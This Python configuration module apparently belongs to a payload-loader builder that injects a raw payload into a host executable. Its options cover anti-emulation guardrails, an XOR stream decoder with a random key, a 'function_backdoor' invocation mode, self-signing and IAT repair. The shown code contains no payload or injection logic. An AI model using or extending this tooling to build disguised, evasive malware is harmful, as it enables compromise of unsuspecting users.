from __future__ import annotations

import secrets
from dataclasses import dataclass, field
from pathlib import Path


REQUIRED_SLOTS = (
    "guardrail",
    "anti_emulation",
    "memory",
    "decoder",
    "execute",
    "pe_invoke",
)

XOR_KEY_MIN_BYTES = 5
XOR_KEY_MAX_BYTES = 10
KEYED_DECODERS = frozenset(("xor", "xor_stream"))


def generate_xor_key() -> bytes:
    length = XOR_KEY_MIN_BYTES + secrets.randbelow(
        XOR_KEY_MAX_BYTES - XOR_KEY_MIN_BYTES + 1
    )
    return secrets.token_bytes(length)


@dataclass(frozen=True)
class Recipe:
    guardrail: str = "none"
    anti_emulation: str = "none"
    memory: str = "image_split_restore"
    decoder: str = "xor_stream"
    execute: str = "thread_keepalive"
    pe_invoke: str = "function_backdoor"

    def as_dict(self) -> dict[str, str]:
        return {slot: getattr(self, slot) for slot in REQUIRED_SLOTS}


@dataclass(frozen=True)
class BuildConfig:
    root: Path
    payload: Path
    host: Path
    output: Path
    artifact_dir: Path
    toolchain: str = "auto"
    profile: str = "auto"
    recipe: Recipe = field(default_factory=Recipe)
    guardrail_value: str | None = None
    xor_key: bytes = field(default_factory=generate_xor_key)
    self_sign: bool = False
    iat_policy: str = "auto"
    payload_location: str = "auto"
    dll_export: str | None = None
    # Deprecated boolean alias. ``None`` means the IAT policy is
    # authoritative; explicit True/False maps to auto/reuse_only.
    repair_missing_iat: bool | None = None
    payload_kind: str = "raw"

    @property
    def effective_iat_policy(self) -> str:
        if self.repair_missing_iat is None:
            return self.iat_policy
        alias_policy = "auto" if self.repair_missing_iat else "reuse_only"
        if self.iat_policy != "auto" and self.iat_policy != alias_policy:
            raise ValueError(
                "repair_missing_iat conflicts with the explicit iat_policy"
            )
        return alias_policy

    @property
    def modules_root(self) -> Path:
        return self.root / "modules"

    @property
    def template_path(self) -> Path:
        return self.root / "templates" / "carrier.c.j2"
